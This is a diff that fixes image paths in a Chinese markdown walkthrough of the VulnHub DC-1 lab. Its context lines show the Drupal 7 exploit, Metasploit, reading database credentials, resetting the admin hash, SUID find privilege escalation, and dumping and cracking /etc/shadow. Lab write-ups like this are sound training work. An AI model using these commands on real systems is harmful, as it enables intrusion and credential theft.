@@ -10,23 +10,23 @@
 
 使用`arp-scan -l`或者`netdiscover -r 192.168.10.1/24`
 
-![](D:\stu\vulnhub\DC靶场\pic-1\1.jpg)
+![](./pic-1/1.jpg)
 
 # 信息收集 
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\DC靶场\pic-1\2.jpg)
+![](./pic-1/2.jpg)
 
 ## 网站信息探测
 
 访问80默认界面
 
-![](D:\stu\vulnhub\DC靶场\pic-1\3.jpg)
+![](./pic-1/3.jpg)
 
 使用`whatweb`搜集指纹，版本为`dripal 7`
 
-![](D:\stu\vulnhub\DC靶场\pic-1\4.jpg)
+![](./pic-1/4.jpg)
 
 使用`gobuster、drisearch、dirb`等扫描工具进行目录爆破
 
@@ -34,13 +34,13 @@
 dirsearch -u http://192.168.10.12 -x 403,404
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\5.jpg)
+![](./pic-1/5.jpg)
 
 扫描需要一些时间，这时候尝试访问网站中的一些常见目录，如`robots.txt`等
 
 访问这个文件后，发现一堆目录
 
-![](D:\stu\vulnhub\DC靶场\pic-1\6.jpg)
+![](./pic-1/6.jpg)
 
 这些目录和扫描出的结果，访问之后，发现并无信息泄露
 
@@ -54,7 +54,7 @@ searchsploit drupal 7
 
 以这个进行测试
 
-![](D:\stu\vulnhub\DC靶场\pic-1\7.jpg)
+![](./pic-1/7.jpg)
 
 首先使用`locate`定位文件， 然后使用`cp`复制到当前目录，为了方便使用
 
@@ -64,11 +64,11 @@ searchsploit drupal 7
 python2 34992.py -t http://192.168.10.12 -u qwer -p 123
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\8.jpg)
+![](./pic-1/8.jpg)
 
 然后使用生成的用户名和密码登录，发现确实可以使用，并直接发现了`flag3`
 
-![](D:\stu\vulnhub\DC靶场\pic-1\9.jpg)
+![](./pic-1/9.jpg)
 
 这里也就看到版本为`7.24`版本，不过到这里我就发现不到利用点了，唉，最终还是要使用`msf`，我这里就是不想使用`msf`的
 
@@ -76,7 +76,7 @@ python2 34992.py -t http://192.168.10.12 -u qwer -p 123
 
 使用`msf`搜索，发现一个可执行，并且包含众多版本，就是使用这个
 
-![](D:\stu\vulnhub\DC靶场\pic-1\10.jpg)
+![](./pic-1/10.jpg)
 
 ```shell
 use 1				#使用该脚本
@@ -87,7 +87,7 @@ run					#执行
 
 执行后，会提示成功，不过这里需要自己输入`shell`命令进入靶机
 
-![](D:\stu\vulnhub\DC靶场\pic-1\11.jpg)
+![](./pic-1/11.jpg)
 
 使用`dpkg`命令查看靶机内安装`python`的版本
 
@@ -101,13 +101,13 @@ dpkg -l | grep python
 python2 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\12.jpg)
+![](./pic-1/12.jpg)
 
 # 寻找flag1
 
 查看当前目录下的文件，发现`flag1.txt`，查看后，提示我们去找配置文件
 
-![](D:\stu\vulnhub\DC靶场\pic-1\13.jpg)
+![](./pic-1/13.jpg)
 
 # 寻找flag2
 
@@ -119,7 +119,7 @@ python2 -c 'import pty;pty.spawn("/bin/bash")'
 find / -name "*settings.php" 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\14.jpg)
+![](./pic-1/14.jpg)
 
 翻译`flag2`的话，就是
 
@@ -129,7 +129,7 @@ find / -name "*settings.php" 2>/dev/null
 
 获取的用户名和密码进行测试，用户名`dbuser`，密码`R0ck3t`
 
-![](D:\stu\vulnhub\DC靶场\pic-1\15.jpg)
+![](./pic-1/15.jpg)
 
 下面连接数据库后使用的命令
 
@@ -142,7 +142,7 @@ show tables;	#查看指定数据库中的表
 select * from users \G;	#查看指定表中的数据
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\16.jpg)
+![](./pic-1/16.jpg)
 
 发现有明显的加密，那么搜索一下，有没有关于这个加密算法的文件
 
@@ -152,7 +152,7 @@ select * from users \G;	#查看指定表中的数据
 find . -name "*pass*" 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\17.jpg)
+![](./pic-1/17.jpg)
 
 其中一个是`bash`脚本，说不定是利用脚本加密，查看一下
 
@@ -160,7 +160,7 @@ find . -name "*pass*" 2>/dev/null
 
 查看`password.inc`文件，因为太多，所以搞了一个关键的，也就是加密采用`sha512`，但是后面的这个就是我没看到，可能是看的太久，眼睛花了，不过这里不重要了
 
-![](D:\stu\vulnhub\DC靶场\pic-1\18.jpg)
+![](./pic-1/18.jpg)
 
 直接使用脚本生成一个加密后的字符
 
@@ -168,7 +168,7 @@ find . -name "*pass*" 2>/dev/null
 php ./scripts/password-hash.sh 123
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\19.jpg)
+![](./pic-1/19.jpg)
 
 生成123的hash值`$S$D2zHNCokKD0hVFQKDOWoioPLA8iJUH3KjzJlvX068bKHQViCjjbV`
 
@@ -178,15 +178,15 @@ php ./scripts/password-hash.sh 123
 update users set pass=123 where uid=1;
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\20.jpg)
+![](./pic-1/20.jpg)
 
 # 寻找flag3
 
 再次访问网站进行登录，使用用户名`admin`和密码`123`进行登录，发现登录成功，并成功发现`flag3`，当然，这在前面的时候就已经通过脚本添加一个管理员账户，并登录成功，看到了`flag3`
 
-![](D:\stu\vulnhub\DC靶场\pic-1\21.jpg)
+![](./pic-1/21.jpg)
 
-![](D:\stu\vulnhub\DC靶场\pic-1\22.jpg)
+![](./pic-1/22.jpg)
 
 进行翻译，查看什么意思
 
@@ -202,7 +202,7 @@ find / -perm -4000 -print 2>/dev/null
 
 发现有`find`，具体用法，如果不清楚，可以参考网站`gtfobins.github.io`
 
-![](D:\stu\vulnhub\DC靶场\pic-1\23.jpg)
+![](./pic-1/23.jpg)
 
 ```shell
 which find	#确定find命令的位置
@@ -211,7 +211,7 @@ which find	#确定find命令的位置
 
 执行后，可以清楚的看到提权成功
 
-![](D:\stu\vulnhub\DC靶场\pic-1\24.jpg)
+![](./pic-1/24.jpg)
 
 不过按照道理这就可以直接看到最终`flag`了，但是说是5个`flag`，所以我们这种直接获取`root`的`bash`，属于直接到最后了
 
@@ -221,7 +221,7 @@ which find	#确定find命令的位置
 find / -exec /bin/cat /etc/shadow \; -quit
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\25.jpg)
+![](./pic-1/25.jpg)
 
 可以获取到该文件中的内容，那么再获取`/etc/passwd`中的内容，把两个文件中的内容分别复制到`kali`中的两个文件中，然后使用`unshadow`进行整合，然后使用`john`进行爆破
 
@@ -230,7 +230,7 @@ unshadow user.txt pass.txt > userpass
 john userpass --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\26.jpg)
+![](./pic-1/26.jpg)
 
 获取到`flag4`用户的密码为`orange`
 
@@ -238,7 +238,7 @@ john userpass --wordlist=/usr/share/wordlists/rockyou.txt
 
 使用`ssh`登录`flag4`，毕竟该服务都开启了，还是要使用一下
 
-![](D:\stu\vulnhub\DC靶场\pic-1\27.jpg)
+![](./pic-1/27.jpg)
 
 这里的`flag4`提示能否使用`find`执行其他命令，其实也就是进行`root`提权了
 
@@ -248,7 +248,7 @@ john userpass --wordlist=/usr/share/wordlists/rockyou.txt
 /usr/bin/find . -exec /bin/sh -p \; -quit
 ```
 
-![](D:\stu\vulnhub\DC靶场\pic-1\28.jpg)
+![](./pic-1/28.jpg)
 
 # 总结
 
